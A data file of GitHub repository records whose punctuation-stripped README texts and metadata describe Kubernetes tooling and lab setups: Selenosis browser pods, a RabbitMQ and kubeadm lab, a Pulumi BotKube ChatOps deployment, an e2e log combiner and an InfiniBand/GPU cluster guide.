session sessionId HTTP wd hub status WS vnc sessionId WS HTTP devtools sessionId HTTP download sessionId HTTP clipboard sessionId HTTP status HTTP healthz Configuration Selenosis requires config to start browsers in K8 cluster Config can be JSON or YAML file Basic configuration be like all fields in this example are mandatory json chrome defaultVersion 85 0 path versions 85 0 image selenoid vnc chrome85 0 86 0 image selenoid vnc chrome86 0 firefox defaultVersion 82 0 path wd hub versions 81 0 image selenoid vnc firefox81 0 82 0 image selenoid vnc firefox82 0 opera defaultVersion 70 0 path versions 70 0 image selenoid vnc opera70 0 71 0 image selenoid vnc opera71 0 yaml chrome defaultVersion 85 0 path versions 85 0 image selenoid vnc chrome85 0 86 0 image selenoid vnc chrome86 0 firefox defaultVersion 82 0 path wd hub versions 81 0 image selenoid vnc firefox81 0 82 0 image selenoid vnc firefox82 0 opera defaultVersion 70 0 path versions 70 0 image selenoid vnc opera70 0 71 0 image selenoid vnc opera71 0 Browser name and browser version are taken from Selenium desired capabilities Each browser can have default spec annotations labels they will merged to all browsers listed in the versions section json chrome defaultVersion 85 0 path meta labels environment aqa app myCoolApp annotations build dev v1 11 2 builder jenkins spec resources requests memory 500Mi cpu 0 5 limits memory 1000Gi cpu 1 hostAliases ip 127 0 0 1 hostnames foo local bar local ip 10 1 2 3 hostnames foo remote bar remote env name TZ value Europe Kiev name SCREENRESOLUTION value 1920x1080x24 name ENABLEVNC value true versions 85 0 image selenoid vnc chrome85 0 86 0 image selenoid vnc chrome86 0 yaml chrome defaultVersion 85 0 path meta labels environment aqa app myCoolApp annotations build dev v1 11 2 builder jenkins spec resources requests memory 500Mi cpu 0 5 limits memory 1000Gi cpu 1 hostAliases ip 127 0 0 1 hostnames foo local bar local ip 10 1 2 3 hostnames foo remote bar remote env name TZ value Europe Kiev name SCREENRESOLUTION value 1920x1080x24 name ENABLEVNC value true versions 85 0 image selenoid vnc chrome85 0 86 0 image selenoid vnc chrome86 0 You can override default browser spec annotation labels by providing individual spec annotation labels to browser version json chrome defaultVersion 85 0 path meta labels environment aqa app myCoolApp annotations build dev v1 11 2 builder jenkins spec resources requests memory 500Mi cpu 0 5 limits memory 1000Gi cpu 1 hostAliases ip 127 0 0 1 hostnames foo local bar local ip 10 1 2 3 hostnames foo remote bar remote env name TZ value Europe Kiev name SCREENRESOLUTION value 1920x1080x24 name ENABLEVNC value true versions 85 0 image selenoid vnc chrome85 0 spec resources requests memory 750Mi cpu 0 5 limits memory 1500Gi cpu 1 86 0 image selenoid vnc chrome86 0 spec hostAliases ip 127 0 0 1 hostnames bla bla com meta labels environment dev app veryCoolApp yaml chrome defaultVersion 85 0 path meta labels environment aqa app myCoolApp annotations build dev v1 11 2 builder jenkins spec resources requests memory 500Mi cpu 0 5 limits memory 1000Gi cpu 1 hostAliases ip 127 0 0 1 hostnames foo local bar local ip 10 1 2 3 hostnames foo remote bar remote env name TZ value Europe Kiev name SCREENRESOLUTION value 1920x1080x24 name ENABLEVNC value true versions 85 0 image selenoid vnc chrome85 0 spec resources requests memory 750Mi cpu 0 5 limits memory 1500Gi cpu 1 86 0 image selenoid vnc chrome86 0 spec hostAliases ip 127 0 0 1 hostnames bla bla com meta labels environment dev app veryCoolApp Deployment Files and steps required for selenosis deployment available in selenosis deploy https github com alcounit selenosis deploy repository Run yout tests java DesiredCapabilities capabilities new DesiredCapabilities capabilities setBrowserName chrome capabilities setVersion 85 0 RemoteWebDriver driver new RemoteWebDriver URI create http wd hub toURL capabilities python from selenium import webdriver capabilities browserName chrome version 85 0 driver webdriver Remote commandexecutor http wd hub desiredcapabilities capabilities Note you can omit browser version in your desired capabilities make sure you set defaultVersion property in the config file Browser pods are deleted right after start Depends on you cluster version in some cases you can face with issue when some browser pods are deleted right after their start and selenosis log will contains lines like this log time 2020 12 21T10 28 20Z level error msg session failed Post http selenoid vnc chrome 87 0 af3177a0 5052 45be b4e4 9462146e4633 seleniferous 4445 wd hub session dial tcp lookup selenoid vnc chrome 87 0 af3177a0 5052 45be b4e4 9462146e4633 seleniferous on 10 96 0 10 53 no such host request POST wd hub session requestid fa150040 86c1 4224 9e5c 21416b1d9f5c timeelapsed 5 73s To fix this issue do the following bash kubectl edit cm coredns n kube system add following record to your coredns config config selenosis svc cluster local 53 errors kubernetes cluster local namespaces selenosis this option will turn off dns caching for selenosis namespace resulting config update should be as following yaml apiVersion v1 data Corefile selenosis svc cluster local 53 errors kubernetes cluster local namespaces selenosis 53 errors health ready kubernetes cluster local in addr arpa ip6 arpa pods insecure fallthrough in addr arpa ip6 arpa prometheus 9153 forward etc resolv conf cache 30 loop reload loadbalance import custom override import custom server kind ConfigMap Features Scalability By default selenosis starts with 2 replica sets To change it edit selenosis deployment file 03 selenosis yaml yaml apiVersion apps v1beta1 kind Deployment metadata name selenosis namespace selenosis spec replicas 2 selector by using kubectl bash kubectl scale deployment selenosis n selenosis replicas 3 Stateless Selenosis doesn t store any session info All connections to the browsers are automatically assigned via headless service Hot config reload Selenosis supports hot config reload to do so update you configMap bash kubectl edit configmap n selenosis selenosis config o yaml UI for debug Selenosis itself doesn t have ui If you need such functionality you can use selenoid ui https github com aerokube selenoid ui with special adapter container https github com alcounit adaptee Deployment steps and minifests you can find in selenosis deploy https github com alcounit selenosis deploy repository Currently this project is under development and can be unstable in case of any bugs or ideas please report,2020-10-26T12:54:31Z,2020-12-23T08:33:29Z,Go,User,1,1,2,42,main,alcounit,1,0,0,0,1,0,8
BAYEGASPARD,k8s-manage-RabbitMQ-and-Apps,,Advance Total virtualization All files can be found in the following github repo https github com BAYEGASPARD k8s manage RabbitMQ and Apps including Dockerfile docker compose yml and all related files Lab Docker and K8s Refer to the following set up for the lab https i imgur com 8viylxB png Installing docker compose To install docker compose we use the following commads on ubuntu 20 We run this command to download the current stabke release sudo curl L https github com docker compose releases download 1 27 4 docker compose uname s uname m o usr local bin docker compose Then we run this command to apply executablke permissions to the binary sudo chmod x usr local bin docker compose We verify it is installed via the followiing docker compose version https i imgur com 97FMOmW png Create a docker file I will create a rabbitmq docker yaml file We create a script for the message creator and message consumer using python see code in github here https github com BAYEGASPARD k8s manage RabbitMQ and Apps asn cons py and producer py Note that the source code of this cons py https github com BAYEGASPARD k8s manage RabbitMQ and Apps blob main cons py there is a function which deal with the message type as well as functions db and db2 to insert on a specific database table namely inttbl and stringtbl def callback ch method properties body body body decode utf 8 print f body is received messages messages append body print messages for message in messages print message if message 23 print int db2 elif message Test print string db There are two python docker files for consumer and for producer as seen in the github page To build and image we use the following command Sample files can be seen from the picture below https i imgur com qJhBTWV png https i imgur com DB1J2W4 png https i imgur com 4OkjZyK png We use the command below to make our container detached using the d argument For convinience I created two docker files one for consumer and one for Producer as seen in the github page provided docker compose up d docker build t I created a docker hub account and created a new repo https i imgur com Se1PWs0 png We can use the following commands to publish using the terminal docker tag bitnami rabbitmq tagname new repo tagname docker push d0k3r200 rabbitmq tagname I think the one in github is sufficient Rabbitmq We set up rabbit mq according to the different configuration files definitions and docker files proposed by the official link provied See github page for the codes We have our rabbitq app running and python scripts functional as seen from the screenshot below https i imgur com 3XPYrvR png After testing we can see that our rabit mq accept and queus messages as well https i imgur com Kxn2nzA png we can now test our python scripts for consumer and producer https i imgur com Wp3i8Za png Now let s I decided to create 3 containers one database one message creator and one message consumer and write to the database Source code can be found in the github link shared above Lets check our 3 containers as well https i imgur com fWEyaYU png Step 1 Kubeadm Installation I also did some other techniques which I used networking to do it Settings 10 0 15 10 k8s master 10 0 15 21 worker01 creator app 10 0 15 22 worker02 conumer db 10 0 15 23 worker03 rabbitmq Root privileges Setup Hosts We edit the virtual hosts to have the different networking for the different applications so they can communicate and the k8s master can reach them since they need to be on the same network sudo vim etc hosts We have the following in the host file 10 0 15 10 k8s master 10 0 15 21 worker01 10 0 15 22 worker02 10 0 15 23 worker03 https i imgur com Yp49ojp png Install Docker Docker can be installed via the following sudo apt install docker io y We restart it using the following sudo systemctl start docker sudo systemctl enable docker https i imgur com UGFiN2o png From industry it is good practice to disable the swap in order to set up kubernetes We use the command sudo swapon s sudo swapoff a sudo vim etc fstab dev mapper hakase labs vg swap1 none swap sw 0 0 https i imgur com icC8Slk png We then reboot our machine to enforce the changes Install Kubeadm Packages We will use kubeadm packages to set up a k8s cluster We install the package from official source sudo apt install y apt transport https Add gpg key for verifications curl s https packages cloud google com apt doc apt key gpg sudo apt key add https i imgur com PjoruRQ png We add the repository for k8s into our source file cd etc apt sudo vim sources list d kubernetes list We add this line into the source file deb http apt kubernetes io kubernetes xenial main Then we update and install k8s manager sudo apt update sudo apt install y kubeadm kubelet kubectl Kubernetes Cluster Initialization We use the following command to initialize our cluster sudo kubeadm init pod network cidr 10 244 10 0 16 apiserver advertise address 10 0 15 10 kubernetes version 1 11 0 NOTE apiserver advertise address determines which IP address Kubernetes should advertise its API server on pod network cidr specify the range of IP addresses for the pod network We re using the flannel virtual network If you want to use another pod network such as weave net or calico change the range IP address See reference for sources We wait for sometime and check using the command kubectl get nodes kubectl get pods all namespaces https i imgur com S8nuxoT png We can add a worker to our node or cluster using the command kubeadm join 10 0 15 10 6443 token daync8 5dcgj6c6xc7l8hay discovery token ca cert hash sha256 65a3e69531d323c335613dea1e498656236bba22e6cf3d5c54b21d744ef97dcd We can check our nodes as well using the command kubectl get nodes https i imgur com nXVAX3d png We can see that our database is recieving messages from the consumer since they are on the same virtual network I created two tables stringtbl and inttbl which from my source code db py or cons py tell which message type to insert in which table For stringtbl https i imgur com aDzMQcW png For inttbl https i imgur com tTdHPtv png More testing Created an nginx yaml file to test against as well We will create a directory called nginx We create a yaml called nginx production yaml and put the following configuration apiVersion apps v1 kind Deployment metadata name nginx deployment labels app nginx spec replicas 3 selector matchLabels app nginx template metadata labels app nginx spec containers name nginx image nginx 1 14 0 ports containerPort 80 Note We are to create new production system named nginx prodcution with app label as nginx with 3 replicas The nginx production will have containers named nginx based on nginx 1 14 0 docker image and will expose the default HTTP port 80 With kubectl we use the following kubectl create f nginx deployment yaml And the second command kubectl get deployments kubectl describe deployment nginx deployment We create kubenetes pods using the following kubectl get pods kubectl describe pods nginx deployment 6cb5f7bf4f t5xfh We create a yaml file named service yaml vim nginx service yaml And put the following configurations apiVersion v1 kind Service metadata name nginx service labels run nginx service spec type NodePort ports port 80 protocol TCP selector app nginx After saving and exiting we type the following kubectl create f nginx service yaml Then we check all available services in the cluster using the command kubectl get service kubectl describe service nginx service https i imgur com GP7tzbG png Using a simple curl command we can get the contents of the different applications as seen below https i imgur com 2kFZqji png References https hub docker com rabbitmq https github com dmaze docker rabbitmq example https medium com better programming introduction to message queue with rabbitmq python 639e397cb668 https habr com ru post 434510 https www digitalocean com community tutorials how to install postgresql on ubuntu 20 04 quickstart https www postgresqltutorial com postgresql insert https www postgresqltutorial com postgresql create table https www tutorialspoint com postgresql postgresqlcreatetable htm https stackoverflow com questions 12906351 importerror no module named psycopg2 23104715 https phoenixnap com kb install kubernetes on ubuntu https ubuntu com kubernetes install,2020-12-14T10:02:26Z,2020-12-22T19:44:56Z,Python,User,1,1,0,10,main,BAYEGASPARD,1,0,0,0,0,0,0
chrisley75,pulumi_deploy_k8s_botkube_ChatOps,,Description pulumi program written in python to create a namespace in a K8s cluster and deploy a bot in it for ChatOps communication Slack Mattermost What isChatOps ChatOps is a way to execute DevOps tasks such as deployments monitoring and system management using chat messages For example sending a logs message to a chatbot retrieves the latest log messages Or a deployment could be triggered from a chat message This offers a few important advantages A very human way to manage your infrastructure by chatting with a bot It can be part of a shared chat so that people can collaborate and share information This also offers a record of executed commands and actions It can help safely overcome network and firewall restrictions to make working from home or on the go possible A unified interface over DevOps tools manage Kubernetes and OpenShift with the same interfaceIt can simplify and secure infrastructure tasks so they can be done by the developers themselves BotKube Backend Architecture source BotKube https www botkube io architecture HLD ChatOps BotKube docs botkubearchitecture png Informer Controller Registers informers to kube apiserver to watch events on the configured Kubernetes resources It forwards the incoming Kubernetes event to the Event Manage Event Manager Extracts required fields from Kubernetes event object and creates a new BotKube event struct It passes BotKube event struct to the Filter Engine Filter Engine Takes the Kubernetes object and BotKube event struct and runs Filters on them Each filter runs some validations on the Kubernetes object and modifies the messages in the BotKube event struct if required Event Notifier Finally notifier sends BotKube event over the configured communication channel Bot Interface Bot interface takes care of authenticating and managing connections with communication mediums like Slack Mattermost It reads sends messages from to commucation mediums Executor Executes BotKube or kubectl command and sends back the result to the Bot interface BotKube ChatOps interaction in multi environment HLD ChatOps BotKube docs botkube png Prerequisites Install BotKube App https www botkube io installation in your Slack Mattermost and remember to keep the associated token when creating the app Create a dedicated channel in Slack Mattermost Have access to a kubernete cluster with privileges access Have a valid pulumi https app pulumi com account Installation Clone this Git Repository bash git clone https github com chrisley75 pulumideployk8sbotkubeChatOps Manual installation Create a folder bash mkdir cd Init a new pulumi stack and configure as a new kubernetes python bash pulumi stack init pulumi new kubernetes python Replace main py with the one in this Github repository Configuration Set pulumi environment variables with your environment information bash pulumi config set SLACKCHANNELNAME pulumi config set CLUSTERNAME pulumi config set ALLOWKUBECTL True pulumi config set secret SLACKAPITOKEN Check the configured variables bash pulumi config KEY VALUE ALLOWKUBECTL True CLUSTERNAME SLACKAPITOKEN SLACKCHANNELNAME or to visualize encrypt vars bash pulumi config show secrets Deploy the ChatOps BotKube with Pulumi bash pulumi up Previewing update dev View Live https app pulumi com chrisley75 k8s apps chatops botkube dev previews 397a3c49 d785 4ca2 aed7 e082b7565dcd Type Name Plan Info pulumi pulumi Stack k8s apps chatops botkube dev create 6 messages kubernetes helm sh Chart botkube create kubernetes rbac authorization k8s io ClusterRole botkube clusterrole create kubernetes rbac authorization k8s io ClusterRoleBinding botkube clusterrolebinding create kubernetes core ServiceAccount botkube botkube sa create kubernetes core Secret botkube botkube communication secret create kubernetes core ConfigMap botkube botkube configmap create kubernetes apps Deployment botkube botkube create kubernetes core Namespace botkube create Diagnostics pulumi pulumi Stack k8s apps chatops botkube dev True True k8schrisley k8schrisley Do you want to perform this update yes Updating dev View Live https app pulumi com chrisley75 k8s apps chatops botkube dev updates 41 Type Name Status Info pulumi pulumi Stack k8s apps chatops botkube dev created 6 messages kubernetes helm sh Chart botkube created kubernetes rbac authorization k8s io ClusterRole botkube clusterrole created kubernetes rbac authorization k8s io ClusterRoleBinding botkube clusterrolebinding created kubernetes core ServiceAccount botkube botkube sa created kubernetes core Secret botkube botkube communication secret created kubernetes core ConfigMap botkube botkube configmap created kubernetes apps Deployment botkube botkube created kubernetes core Namespace botkube created Diagnostics pulumi pulumi Stack k8s apps chatops botkube dev True True k8schrisley k8schrisley Resources 9 created Duration 12s If everything went well the deployment appears directly in your ChatOps and it is now possible to view and manage the cluster or several clusters from the channel k8s cluster appears in the channel docs deployok png Manage Kubernetes cluster with Chat Check cluster is ready k8s ping from chat docs ping png Kubectl command to get namespace on the cluster k8s get namespace docs getns png Get state of the creation on resource in the cluster Resource creation monitor docs creation png be automatically alerted in case of a problem on the cluster Resource creation monitor docs errors png and so many other possibilities Delete and remove app This action will delete the app and the namespace in the K8s cluster Only resources created by this program but not the stack in pulumi bash pulumi destroy Previewing destroy dev View Live https app pulumi com chrisley75 k8s apps chatops botkube dev previews 834376a4 587b 46e8 9838 5b5666f18b03 Type Name Plan pulumi pulumi Stack k8s apps chatops botkube dev delete kubernetes helm sh Chart botkube delete kubernetes rbac authorization k8s io ClusterRole botkube clusterrole delete kubernetes rbac authorization k8s io ClusterRoleBinding botkube clusterrolebinding delete kubernetes core ServiceAccount botkube botkube sa delete kubernetes core ConfigMap botkube botkube configmap delete kubernetes core Secret botkube botkube communication secret delete kubernetes apps Deployment botkube botkube delete kubernetes core Namespace botkube delete Resources 9 to delete Do you want to perform this destroy yes Destroying dev View Live https app pulumi com chrisley75 k8s apps chatops botkube dev updates 40 Type Name Status pulumi pulumi Stack k8s apps chatops botkube dev deleted kubernetes helm sh Chart botkube deleted kubernetes core ConfigMap botkube botkube configmap deleted kubernetes core Secret botkube botkube communication secret deleted kubernetes core ServiceAccount botkube botkube sa deleted kubernetes rbac authorization k8s io ClusterRole botkube clusterrole deleted kubernetes rbac authorization k8s io ClusterRoleBinding botkube clusterrolebinding deleted kubernetes apps Deployment botkube botkube deleted kubernetes core Namespace botkube deleted Resources 9 deleted Duration 18s The resources in the stack have been deleted but the history and configuration associated with the stack are still maintained If you want to remove the stack completely run pulumi stack rm dev Author Christopher LEY SRE and MultiCloud Architect at IBM IBM Services christopher ley ibm com,2020-09-10T16:57:14Z,2020-09-11T07:53:12Z,Python,User,1,1,0,18,master,chrisley75,1,0,0,0,0,0,0
brianpursley,k8s-e2e-log-combiner,kubernetes,k8s e2e log combiner Combines all log artifacts into a single file sorted by timestamp It takes one argument which can be either 1 A prow k8s io url or the gcsweb k8s io url 2 A local directory containing log files It will read build log txt and all files ending in log combine them sort them and write the output to stdout Usage Examples Go Run Combine log files from a prow url go run combiner go https prow k8s io view gcs kubernetes jenkins pr logs pull 92064 pull kubernetes e2e gce ubuntu containerd 1301618335330340866 Combine log files from a local path go run combiner go path to log files Usage Examples Docker Combine log files from a prow url docker run brianpursley k8s e2e log combiner https prow k8s io view gcs kubernetes jenkins pr logs pull 92064 pull kubernetes e2e gce ubuntu containerd 1301618335330340866 Combine log files from a local path For this you will need to mount your local directory into the docker container like this docker run v path to log files foo brianpursley k8s e2e log combiner foo Output format Output consists of a timestamp a truncated filename and the log message Example excerpt 20 49 58 096058452 artifacts e2e 40 c a7d53 minion group hfgh containerd log time 2020 09 03T20 49 58 096058452Z level info msg Exec process 4433fe624c90bbc45c4943bf1986f73286dcd8707ca4f8ebcf569b28dd76896a exits with exit code 0 and error 20 49 58 100716000 artifacts e2e 40 135c a7d53 minion group hfgh kubelet log I0903 20 49 58 100716 9097 desiredstateofworldpopulator go 361 Added volume default token ngcz4 volSpec default token ngcz4 for pod df47b3c8 a32a 4cd2 8ae2 c84d4be52016 to desired state 20 49 58 100895000 artifacts e2e 40 135c a7d53 minion group hfgh kubelet log I0903 20 49 58 100895 9097 sharedinformer go 270 caches populated 20 49 58 100954000 artifacts e2e 40 135c a7d53 minion group hfgh kubelet log I0903 20 49 58 100954 9097 sharedinformer go 270 caches populated 20 49 58 105874881 artifacts e2e 40 c a7d53 minion group hfgh containerd log time 2020 09 03T20 49 58 105874881Z level info msg Finish piping stdout of container exec 4433fe624c90bbc45c4943bf1986f73286dcd8707ca4f8ebcf569b28dd76896a 20 49 58 106509345 artifacts e2e 40 c a7d53 minion group hfgh containerd log time 2020 09 03T20 49 58 106509345Z level info msg Finish piping stderr of container exec 4433fe624c90bbc45c4943bf1986f73286dcd8707ca4f8ebcf569b28dd76896a 20 49 58 126818000 artifacts e2e 40 135c a7d53 minion group hfgh kubelet log I0903 20 49 58 126818 9097 reconciler go 254 Starting operationExecutor MountVolume for volume default token ngcz4 UniqueName kubernetes io secret df47b3c8 a32a 4cd2 8ae2 c84d4be52016 default token ngcz4 pod affinity nodeport timeout ww59w UID df47b3c8 a32a 4cd2 8ae2 c84d4be52016 Volume is already mounted to pod but remount was requested,2020-08-28T20:33:24Z,2020-09-15T16:17:13Z,Go,User,1,1,0,10,master,brianpursley,1,0,4,0,0,0,0
BLshlomo,Azure-Private-K8s-Cluster-Private-Registry-Terraform,,,2020-12-07T10:40:37Z,2020-12-14T23:14:24Z,HCL,User,1,1,1,11,master,BLshlomo,1,0,0,0,0,0,0
csmykay,IBoIP-GPU-k8s-container-setup,,Infiniband Host Pre requesites for CentOS 7 6 1 Ensure RDMA shared device plug in is enabled on all hosts and all Infiniband switches that require IBoverIP support for k8s Please run SM on one of the InfiniBand managed switches according to the example swx mld s01 standalone master enable swx mld s01 standalone master configure terminal swx mld s01 standalone master config ib smnode swx mld s01 enable swx mld s01 standalone master config ib smnode swx mld s01 sm priority 0 swx mld s01 standalone master config ib sm virt enable swx mld s01 standalone master config write memory swx mld s01 standalone master config reload 2 Ensure that NVIDIA drivers are installed by following https docs nvidia com cuda cuda installation guide linux index html pre installation actions Use this package for the cuda repo RPM https developer download nvidia com compute cuda repos rhel7 x8664 cuda repo rhel7 10 2 89 1 x8664 rpm 3 Install docker2 driver and remove docker1 driver by following https docs nvidia com datacenter cloud native container toolkit install guide html docker 4 Install you required MOFED version on the host Downlaod MLNX drivers if not already installed https www mellanox com products infiniband drivers linux mlnxofed Upload tgz file to box and untar and run mlnxofedinstall script and follow prompts Add additional setting to your modprobe configuration for your kernel sudo vi etc modprobe d ibipoib conf EXAMPLE alias netdev ib ibipoib options ibipoib ipoibenhanced 0 5 For the purposes of this test disable firewalld on your system systemctl disable firewalld systemctl stop firewalld 6 Restart your server s Installing Kubernetes To Support Infiniband Over IP and GPU Support 1 Install K8s cluster with Kubespray https docs mellanox com pages releaseview action pageId 19818992 Instructions above changed for CentOS box If you already don t have a key to use create one ssh keygen ssh copy id root If you do not have root then someone will have to copy the idrsa pub key to the pub or ssh folder under the root directory and create a file called authorizedkeys with the pub key in it and ensure it is chmod 600 Install pip and git to start the Kubespray installation a utility that helps you setup a k8s cluster cd sudo yum install y python3 pip git git clone https github com kubernetes sigs kubespray git cd kubespray sudo pip3 install r requirements txt cp rfp inventory sample inventory mycluster Note the IP AND Hostname of the server you are currently on and change yourhostip and node1 to your IP and hostname of your server If you don t Kubespray will automatically change your hostname in your etc hostname file to the default of node1 which will cause problems declare a IPS youhostsip CONFIGFILE inventory mycluster hosts yaml python3 contrib inventorybuilder inventory py IPS vi inventory mycluster hosts yaml remove all node2 X hosts if any and change node1 referendces to be the hostname of your server EXAMPLE Before all hosts node1 ansiblehost 10 100 0 147 ip 10 100 0 147 accessip 10 100 0 147 children localhost kube master hosts node1 kube node hosts node1 etcd hosts node1 k8s cluster children kube master kube node calico rr hosts EXAMPLE After all hosts znode47 ansiblehost 10 100 0 147 ip 10 100 0 147 accessip 10 100 0 147 children kube master hosts znode47 kube node hosts znode47 etcd hosts znode47 k8s cluster children kube master kube node calico rr hosts If you are behind a proxy server change this setting in vi inventory mycluster groupvars all all yml BEFORE Some problems may occur when downloading files over https proxy due to ansible bug https github com ansible ansible issues 32750 Set this variable to False to disable SSL validation of geturl module Note that kubespray will still be performing checksum validation downloadvalidatecerts False AFTER Some problems may occur when downloading files over https proxy due to ansible bug https github com ansible ansible issues 32750 Set this variable to False to disable SSL validation of geturl module Note that kubespray will still be performing checksum validation downloadvalidatecerts True Review your k8s deployment cat inventory mycluster groupvars k8s cluster k8s cluster yml Deploy your k8s cluster sudo ansible playbook i inventory mycluster hosts yaml become become user root cluster yml Verify you k8s cluster is up kubectl get nodes o wide NAME STATUS ROLES AGE VERSION INTERNAL IP EXTERNAL IP OS IMAGE KERNEL VERSION CONTAINER RUNTIME znode47 Ready master 5m47s v1 19 1 10 100 0 147 CentOS Linux 7 Core 3 10 0 957 el7 x8664 docker 19 3 12 If you get an error The connection to the server localhost 8080 was refused did you specify the right host or port Then you do the following steps if you are root you should not have this problem only another user name with SUDO rights will have this issue sudo cp etc kubernetes admin conf sudo chown id u id g admin conf export KUBECONFIG admin conf kubectl get nodes o wide NAME STATUS ROLES AGE VERSION INTERNAL IP EXTERNAL IP OS IMAGE KERNEL VERSION CONTAINER RUNTIME znode47 Ready master 5m47s v1 19 1 10 100 0 147 CentOS Linux 7 Core 3 10 0 957 el7 x8664 docker 19 3 12 Also if you are behind a proxy server ensure all of your shell proxy settings are set correctly and that you have setup proxy settings on docker after KubeSpray installs docker for you https www serverlab ca tutorials linux administration linux setting a proxy in centos and red hat https docs docker com network proxy 3 Install nvidia k8s device plug in https github com NVIDIA k8s device plugin First make the follow changes to your docker daemon json failure to do so will not allow it to be used in the k8s cluster with the appropriate label sudo vi etc docker daemon json runtimes nvidia path nvidia container runtime runtimeArgs default runtime nvidia On my test enviroment I had an issue with Docker not routing traffic properly and had to add a rule to my iptables setup iptables t nat A POSTROUTING s 172 17 0 0 16 o docker0 j MASQUERADE And then restart docker systemctl restart docker service 4 Add the NVIDIA k8s device plug in https github com NVIDIA k8s device plugin kubectl create f https raw githubusercontent com NVIDIA k8s device plugin v0 7 0 nvidia device plugin yml sudo kubectl get pod A NAMESPACE NAME READY STATUS RESTARTS AGE default cuda vector add 0 1 Completed 0 28h default dnsutils 1 1 Running 131 5d8h default mofed test pod 1 1 Running 7 5d3h default nginx pod 1 1 Running 0 9h default test pod ipoib0 1 1 Running 2 4d8h kube system calico kube controllers 776454857f gpg2f 1 1 Running 8 5d9h kube system calico node 76ln5 1 1 Running 10 5d7h kube system coredns 65c659677c t59s4 0 1 Pending 0 5d7h kube system coredns 65c659677c vqlw9 0 1 Pending 0 5d9h kube system coredns 7844d4fd79 rp2sm 1 1 Running 7 5d9h kube system dns autoscaler 5b7b5c9b6f xz4jt 1 1 Running 7 5d23h kube system dns autoscaler 5f8dbbf9c4 sr82t 0 1 Pending 0 5d9h kube system kube apiserver znode47 1 1 Running 10 5d23h kube system kube controller manager znode47 1 1 Running 8 5d23h kube system kube ipoib cni ds amd64 g4cpz 1 1 Running 2 4d9h kube system kube multus ds amd64 5d4ld 1 1 Running 0 9h kube system kube proxy j2q9s 1 1 Running 8 5d7h kube system kube scheduler znode47 1 1 Running 7 5d23h kube system kubernetes dashboard 7fc5b58d5f pl447 1 1 Running 79 5d7h kube system kubernetes metrics scraper 7b4b7d88cd rdtgp 1 1 Running 7 5d9h kube system nodelocaldns gkfk9 1 1 Running 7 5d23h kube system nvidia device plugin daemonset 9hgqk 1 1 Running 1 28h Working kube system rdma shared dp ds z7vnw 1 1 Running 2 4d9h kube system whereabouts qmcsn 1 1 Running 2 4d9h Test NVIDIA CUDA GPU support is setup by creating a quick pod cd mkdir cuda k8s test cat EOF kubectl create f apiVersion v1 kind Pod metadata name cuda vector add spec restartPolicy OnFailure containers name cuda vector add image k8s gcr io cuda vector add v0 1 resources limits nvidia com gpu 1 requesting 1 GPU sudo kubectl get pod A NAMESPACE NAME READY STATUS RESTARTS AGE default cuda vector add 0 1 Completed 0 28h Working default dnsutils 1 1 Running 131 5d8h default mofed test pod 1 1 Running 7 5d3h default nginx pod 1 1 Running 0 9h 5 Install Multus meta CNI for k8s https github com intel multus cni cd git clone https github com intel multus cni git cd multus cni cat images multus daemonset yml kubectl apply f 6 Install K8s RDMA Shared DP Via DP for k8s https github com Mellanox k8s rdma shared dev plugin cd git clone https github com Mellanox k8s rdma shared dev plugin git cd k8s rdma shared dev plugin kubectl create f images k8s rdma shared dev plugin config map yaml kubectl create f images k8s rdma shared dev plugin ds yaml kubectl n kube system get configmap rdma devices o yaml Optional If you need to you can edit the number of config maps by running sudo kubectl n kube system edit configmap rdma devices and changing it from the 1000 number to say 20 Test RDMA support is setup by creating a quick pod kubectl create f example test hca pod yaml sudo kubectl get pods NAME READY STATUS RESTARTS AGE cuda vector add 0 1 Completed 0 28h dnsutils 1 1 Running 131 5d7h mofed test pod 1 1 Running 7 5d3h Working nginx pod 1 1 Running 0 9h test pod ipoib0 1 1 Running 2 4d7h 7 Install IBoIP CNI for k8s https github com Mellanox ipoib cni cd git clone https github com Mellanox ipoib cni git cd ipoib cni kubectl create f images ipoib cni daemonset yaml sudo kubectl get pod A NAMESPACE NAME READY STATUS RESTARTS AGE default cuda vector add 0 1 Completed 0 28h default dnsutils 1 1 Running 131 5d8h default mofed test pod 1 1 Running 7 5d3h default nginx pod 1 1 Running 0 9h default test pod ipoib0 1 1 Running 2 4d8h kube system calico kube controllers 776454857f gpg2f 1 1 Running 8 5d9h kube system calico node 76ln5 1 1 Running 10 5d7h kube system coredns 65c659677c t59s4 0 1 Pending 0 5d7h kube system coredns 65c659677c vqlw9 0 1 Pending 0 5d9h kube system coredns 7844d4fd79 rp2sm 1 1 Running 7 5d9h kube system dns autoscaler 5b7b5c9b6f xz4jt 1 1 Running 7 5d23h kube system dns autoscaler 5f8dbbf9c4 sr82t 0 1 Pending 0 5d9h kube system kube apiserver znode47 1 1 Running 10 5d23h kube system kube controller manager znode47 1 1 Running 8 5d23h kube system kube ipoib cni ds amd64 g4cpz 1 1 Running 2 4d9h Working kube system kube multus ds amd64 5d4ld 1 1 Running 0 9h kube system kube proxy j2q9s 1 1 Running 8 5d7h kube system kube scheduler znode47 1 1 Running 7 5d23h kube system kubernetes dashboard 7fc5b58d5f pl447 1 1 Running 79 5d7h kube system kubernetes metrics scraper 7b4b7d88cd rdtgp 1 1 Running 7 5d9h kube system nodelocaldns gkfk9 1 1 Running 7 5d23h kube system nvidia device plugin daemonset 9hgqk 1 1 Running 1 28h kube system rdma shared dp ds z7vnw 1 1 Running 2 4d9h kube system whereabouts qmcsn 1 1 Running 2 4d9h 8 Install IPAM CNI plugin for k8s https github com openshift whereabouts cni cd git clone https github com openshift whereabouts cni git cd whereabouts cni kubectl apply f doc daemonset install yaml f doc whereabouts cni cncf ioippools yaml f doc whereabouts cni cncf iooverlappingrangeipreservations yaml sudo kubectl get pod A NAMESPACE NAME READY STATUS RESTARTS AGE default cuda vector add 0 1 Completed 0 2d16h default dnsutils 1 1 Running 167 6d20h default mofed test pod 1 1 Running 7 6d15h default nginx pod 1 1 Running 0 45h default test pod ipoib0 1 1 Running 2 5d20h kube system calico kube controllers 776454857f gpg2f 1 1 Running 8 6d21h kube system calico node 76ln5 1 1 Running 10 6d19h kube system coredns 65c659677c t59s4 0 1 Pending 0 6d19h kube system coredns 65c659677c vqlw9 0 1 Pending 0 6d21h kube system coredns 7844d4fd79 rp2sm 1 1 Running 7 6d21h kube system dns autoscaler 5b7b5c9b6f xz4jt 1 1 Running 7 7d11h kube system dns autoscaler 5f8dbbf9c4 sr82t 0 1 Pending 0 6d21h kube system kube apiserver znode47 1 1 Running 10 7d11h kube system kube controller manager znode47 1 1 Running 8 7d11h kube system kube ipoib cni ds amd64 g4cpz 1 1 Running 2 5d21h kube system kube multus ds amd64 